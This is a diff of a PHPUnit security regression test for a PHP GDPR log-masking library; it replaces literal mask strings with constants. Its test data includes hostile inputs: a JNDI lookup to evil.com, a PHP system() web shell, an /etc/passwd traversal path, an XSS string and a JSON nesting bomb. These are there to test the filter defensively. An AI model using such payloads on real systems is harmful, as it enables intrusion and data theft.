@@ -15,6 +15,7 @@ use PHPUnit\Framework\Attributes\DataProvider;
 use Monolog\LogRecord;
 use Monolog\Level;
 use Ivuorinen\MonologGdprFilter\GdprProcessor;
+use Ivuorinen\MonologGdprFilter\MaskConstants;
 use Ivuorinen\MonologGdprFilter\RateLimiter;
 use Ivuorinen\MonologGdprFilter\RateLimitedAuditLogger;
 use Ivuorinen\MonologGdprFilter\FieldMaskConfig;
@@ -259,7 +260,7 @@ class SecurityRegressionTest extends TestCase
         $current = 'deep_value';
 
         $processor = $this->createProcessor(
-            patterns: ['/deep_value/' => '***MASKED***'],
+            patterns: ['/deep_value/' => MaskConstants::MASK_MASKED],
             fieldPaths: [],
             customCallbacks: [],
             auditLogger: null,
@@ -303,7 +304,7 @@ class SecurityRegressionTest extends TestCase
         $jsonBomb = str_repeat('{"a":', 100) . '"value"' . str_repeat('}', 100);
 
         $processor = $this->createProcessor(
-            patterns: ['/value/' => '***MASKED***'],
+            patterns: ['/value/' => MaskConstants::MASK_MASKED],
             fieldPaths: [],
             customCallbacks: [],
             auditLogger: null,
@@ -428,8 +429,8 @@ class SecurityRegressionTest extends TestCase
         PatternValidator::clearCache();
 
         $patterns = [
-            '/email\w+@\w+\.\w+/' => '***EMAIL***',
-            '/phone\d{10}/' => '***PHONE***',
+            '/email\w+@\w+\.\w+/' => MaskConstants::MASK_EMAIL,
+            '/phone\d{10}/' => MaskConstants::MASK_PHONE,
             '/ssn\d{3}-\d{2}-\d{4}/' => '***SSN***',
         ];
 
@@ -486,9 +487,9 @@ class SecurityRegressionTest extends TestCase
     {
         $maliciousFieldPaths = [
             '../../../etc/passwd' => FieldMaskConfig::remove(),
-            '${jndi:ldap://evil.com/}' => FieldMaskConfig::replace('***MASKED***'),
+            '${jndi:ldap://evil.com/}' => FieldMaskConfig::replace(MaskConstants::MASK_MASKED),
             '<?php system($_GET["cmd"]); ?>' => FieldMaskConfig::remove(),
-            'javascript:alert("xss")' => FieldMaskConfig::replace('***MASKED***'),
+            'javascript:alert("xss")' => FieldMaskConfig::replace(MaskConstants::MASK_MASKED),
             'eval(base64_decode("..."))' => FieldMaskConfig::remove(),
         ];
 
@@ -529,7 +530,7 @@ class SecurityRegressionTest extends TestCase
             // If field is present and processed, check if it's masked
             $value = $result->context['${jndi:ldap://evil.com/}'];
             $this->assertTrue(
-                $value === '***MASKED***' || $value === 'malicious_payload',
+                $value === MaskConstants::MASK_MASKED || $value === 'malicious_payload',
                 'Field should be either masked or safely processed'
             );
         }
@@ -607,7 +608,7 @@ class SecurityRegressionTest extends TestCase
     public function boundaryValueSafety(mixed $boundaryValue): void
     {
         $processor = $this->createProcessor(
-            patterns: ['/.*/' => '***MASKED***'],
+            patterns: ['/.*/' => MaskConstants::MASK_MASKED],
             fieldPaths: [],
             customCallbacks: [],
             auditLogger: null,
